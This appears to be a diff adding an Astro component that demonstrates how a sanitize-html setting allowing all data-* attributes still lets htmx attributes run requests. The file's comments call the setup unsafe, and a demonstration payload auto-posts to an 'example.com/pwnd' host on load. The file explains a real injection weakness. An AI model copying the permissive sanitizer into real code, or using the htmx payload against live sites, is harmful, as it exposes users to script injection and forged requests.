@@ -1,0 +1,22 @@
+---
+import sanitizeHtml from 'sanitize-html';
+
+export type Props = {
+	text: string;
+};
+// but unsafe htmx
+const safeHtml = (raw: string) =>
+	sanitizeHtml(raw, {
+		allowedAttributes: {
+			'*': ['data-*'],
+		},
+	});
+// this is not obviously bad, because it blocks script tags, but still allows you to run arbitrary JS through data attributes
+---
+
+<span class="text-sm" set:html={safeHtml(Astro.props.text)} />
+<span
+	set:html={safeHtml(
+		'<pre><a data-hx-post="https://example.com/pwnd" data-hx-trigger="load, click">Click Me! or dont, same thing</a></pre><script>console.log(1234)</script>'
+	)}
+/>
